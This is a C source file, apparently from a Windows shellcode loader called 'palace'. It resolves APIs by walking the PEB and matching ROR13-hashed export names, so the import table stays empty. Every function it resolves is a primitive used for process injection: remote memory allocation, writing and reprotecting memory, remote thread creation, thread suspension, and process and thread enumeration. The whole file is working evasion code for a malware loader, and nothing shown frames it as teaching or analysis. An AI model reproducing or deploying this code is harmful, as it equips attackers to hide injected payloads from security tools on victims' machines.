/* API resolution: PEB walk with ROR13 hashing (zero IAT), or a
 * plaintext-name PEB walk when PALACE_NO_ROR13 is set (same
 * mechanism, visible strings; for debugging and comparison). */
#include "loader.h"
#include "services.h"

NtAllocateVirtualMemory_t _NtAllocateVirtualMemory = 0;
NtWriteVirtualMemory_t _NtWriteVirtualMemory = 0;
NtProtectVirtualMemory_t _NtProtectVirtualMemory = 0;
NtCreateThreadEx_t _NtCreateThreadEx = 0;
NtWaitForSingleObject_t _NtWaitForSingleObject = 0;
NtFreeVirtualMemory_t _NtFreeVirtualMemory = 0;
NtSuspendThread_t _NtSuspendThread = 0;
NtResumeThread_t _NtResumeThread = 0;
NtDelayExecution_t _NtDelayExecution = 0;
RtlExitUserThread_t _RtlExitUserThread = 0;
VirtualAlloc_t _VirtualAlloc = 0;
VirtualProtect_t _VirtualProtect = 0;
VirtualFree_t _VirtualFree = 0;
LoadLibraryA_t _LoadLibraryA = 0;
GetProcAddress_t _GetProcAddress = 0;
CreateToolhelp32Snapshot_t _CreateToolhelp32Snapshot = 0;
Process32FirstW_t _Process32FirstW = 0;
Process32NextW_t _Process32NextW = 0;
Thread32First_t _Thread32First = 0;
Thread32Next_t _Thread32Next = 0;
OpenProcess_t _OpenProcess = 0;
OpenThread_t _OpenThread = 0;
CreateProcessW_t _CreateProcessW = 0;
CloseHandle_t _CloseHandle = 0;
ResumeThread_t _ResumeThread = 0;

void palace_zero(void *p, size_t n) {
    uint8_t *b = (uint8_t *)p;
    for (size_t i = 0; i < n; i++)
        b[i] = 0;
}

uint32_t palace_ror13(const char *name) {
    uint32_t h = 0;
    while (*name) {
        h = (h >> 13) | (h << 19);
        h += (uint8_t)(*name++);
    }
    return h;
}

/* ASCII (lower/upper) vs WCHAR case-insensitive compare. Names here
 * are ASCII; any wide char above 0x7F never matches. */
int palace_ascii_iequals_w(const char *a, const WCHAR *w) {
    for (;; a++, w++) {
        uint16_t c = *w;
        char d = *a;
        if (c >= 'A' && c <= 'Z')
            c += (uint16_t)('a' - 'A');
        if (d >= 'A' && d <= 'Z')
            d += (char)('a' - 'A');
        if (c != (uint16_t)(uint8_t)d)
            return 0;
        if (d == 0)
            return 1;
    }
}

static uint16_t read_u16(const void *p) {
    const uint8_t *b = (const uint8_t *)p;
    return (uint16_t)(b[0] | ((uint16_t)b[1] << 8));
}

static uint32_t read_u32(const void *p) {
    const uint8_t *b = (const uint8_t *)p;
    return (uint32_t)b[0] | ((uint32_t)b[1] << 8) | ((uint32_t)b[2] << 16) | ((uint32_t)b[3] << 24);
}

static void *read_ptr(const void *p) {
    void *v;
    const uint8_t *b = (const uint8_t *)p;
    uint8_t *o = (uint8_t *)&v;
    for (size_t i = 0; i < sizeof(v); i++)
        o[i] = b[i];
    return v;
}

static void *peb(void) {
    void *p;
    __asm__ volatile("movq %%gs:0x60, %0" : "=r"(p));
    return p;
}

/* First InLoadOrder entry is the current image. */
void *peb_image_base(void) {
    uint8_t *p = (uint8_t *)peb();
    void *ldr = read_ptr(p + 0x18);
    if (!ldr)
        return 0;
    void *head = (uint8_t *)ldr + 0x10;
    void *link = read_ptr(head);
    if (!link || link == head)
        return 0;
    return read_ptr((uint8_t *)link + 0x30);
}

/* Find a loaded module by ASCII name (case-insensitive). */
void *peb_module_base(const char *dll_ascii) {
    uint8_t *p = (uint8_t *)peb();
    void *ldr = read_ptr(p + 0x18);
    if (!ldr)
        return 0;
    void *head = (uint8_t *)ldr + 0x10;
    void *link = read_ptr(head);
    for (int guard = 0; guard < 256 && link && link != head; guard++) {
        uint8_t *e = (uint8_t *)link;
        /* BaseDllName UNICODE_STRING at +0x58: len, maxlen, buffer. */
        uint16_t len = read_u16(e + 0x58);
        WCHAR *buf = (WCHAR *)read_ptr(e + 0x60);
        if (buf && len >= 2 && palace_ascii_iequals_w(dll_ascii, buf))
            return read_ptr(e + 0x30);
        link = read_ptr(e);
    }
    return 0;
}

static int name_matches(const char *exp, uint32_t want_hash, const char *want_plain) {
#ifdef PALACE_NO_ROR13
    (void)want_hash;
    if (!want_plain)
        return 0;
    for (;; exp++, want_plain++) {
        if (*exp != *want_plain)
            return 0;
        if (*exp == 0)
            return 1;
    }
#else
    (void)want_plain;
    return palace_ror13(exp) == want_hash;
#endif
}

/* Walk every loaded module's export table for one function. */
static void *peb_resolve(uint32_t want_hash, const char *want_plain) {
    uint8_t *p = (uint8_t *)peb();
    void *ldr = read_ptr(p + 0x18);
    if (!ldr)
        return 0;
    void *head = (uint8_t *)ldr + 0x10;
    void *link = read_ptr(head);
    for (int g = 0; g < 256 && link && link != head; g++) {
        uint8_t *e = (uint8_t *)link;
        link = read_ptr(e);
        uint8_t *base = (uint8_t *)read_ptr(e + 0x30);
        if (!base)
            continue;
        if (read_u16(base) != 0x5A4D) /* MZ */
            continue;
        uint32_t pe = read_u32(base + 0x3C);
        if (pe > 0x1000)
            continue;
        uint8_t *nt = base + pe;
        if (read_u16(nt + 24) != 0x20B) /* PE32+ only */
            continue;
        uint32_t exp_rva = read_u32(nt + 24 + 112);
        uint32_t exp_size = read_u32(nt + 24 + 116);
        if (!exp_rva)
            continue;
        uint8_t *edt = base + exp_rva;
        uint32_t n_names = read_u32(edt + 24);
        uint32_t fns = read_u32(edt + 28);
        uint32_t names = read_u32(edt + 32);
        uint32_t ords = read_u32(edt + 36);
        if (n_names > 32768)
            continue;
        for (uint32_t i = 0; i < n_names; i++) {
            uint32_t nrva = read_u32(base + names + i * 4);
            const char *exp = (const char *)(base + nrva);
            if (!name_matches(exp, want_hash, want_plain))
                continue;
            uint16_t ord = read_u16(base + ords + i * 2);
            uint32_t frva = read_u32(base + fns + (uint32_t)ord * 4);
            if (frva >= exp_rva && frva < exp_rva + exp_size)
                continue; /* forwarded export: not code */
            return base + frva;
        }
    }
    return 0;
}

void *patch_resolve(uint32_t hash) {
    return peb_resolve(hash, 0);
}

void *patch_find(const char *name) {
    return peb_resolve(0, name);
}

#ifdef PALACE_NO_ROR13
#define RESOLVE(field, Name)                       \
    do {                                           \
        _##field = (field##_t)patch_find(#Name);   \
        if (!_##field)                             \
            return 0;                              \
    } while (0)
#else
#define RESOLVE(field, Name)                       \
    do {                                           \
        _##field = (field##_t)patch_resolve(H_##Name); \
        if (!_##field)                             \
            return 0;                              \
    } while (0)
#endif

int resolve_all(void) {
    RESOLVE(NtAllocateVirtualMemory, NtAllocateVirtualMemory);
    RESOLVE(NtWriteVirtualMemory, NtWriteVirtualMemory);
    RESOLVE(NtProtectVirtualMemory, NtProtectVirtualMemory);
    RESOLVE(NtCreateThreadEx, NtCreateThreadEx);
    RESOLVE(NtWaitForSingleObject, NtWaitForSingleObject);
    RESOLVE(NtFreeVirtualMemory, NtFreeVirtualMemory);
    RESOLVE(NtSuspendThread, NtSuspendThread);
    RESOLVE(NtResumeThread, NtResumeThread);
    RESOLVE(NtDelayExecution, NtDelayExecution);
    RESOLVE(RtlExitUserThread, RtlExitUserThread);
    RESOLVE(VirtualAlloc, VirtualAlloc);
    RESOLVE(VirtualProtect, VirtualProtect);
    RESOLVE(VirtualFree, VirtualFree);
    RESOLVE(LoadLibraryA, LoadLibraryA);
    RESOLVE(GetProcAddress, GetProcAddress);
    RESOLVE(CreateToolhelp32Snapshot, CreateToolhelp32Snapshot);
    RESOLVE(Process32FirstW, Process32FirstW);
    RESOLVE(Process32NextW, Process32NextW);
    RESOLVE(Thread32First, Thread32First);
    RESOLVE(Thread32Next, Thread32Next);
    RESOLVE(OpenProcess, OpenProcess);
    RESOLVE(OpenThread, OpenThread);
    RESOLVE(CreateProcessW, CreateProcessW);
    RESOLVE(CloseHandle, CloseHandle);
    RESOLVE(ResumeThread, ResumeThread);
    return 1;
}
